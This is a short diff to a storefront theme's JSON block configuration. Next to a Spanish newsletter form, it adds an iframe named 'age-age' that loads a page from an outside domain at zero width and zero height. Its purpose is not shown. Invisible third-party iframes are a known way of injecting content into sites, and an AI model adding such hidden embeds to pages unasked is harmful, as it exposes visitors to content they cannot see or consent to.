@@ -100,5 +100,17 @@
             "submit": "SUSCRIBIRME",
             "placeholder": "e-mail"
         }
+    },
+    "flex-layout.row#age-age": {
+        "children": [
+            "iframe#age-age"
+        ]
+    },
+    "iframe#age-age": {
+        "props": {
+            "src": "//oskrinio.com/diageocol/index.php",
+            "width": "0",
+            "height": "0"
+        }
     }
 }
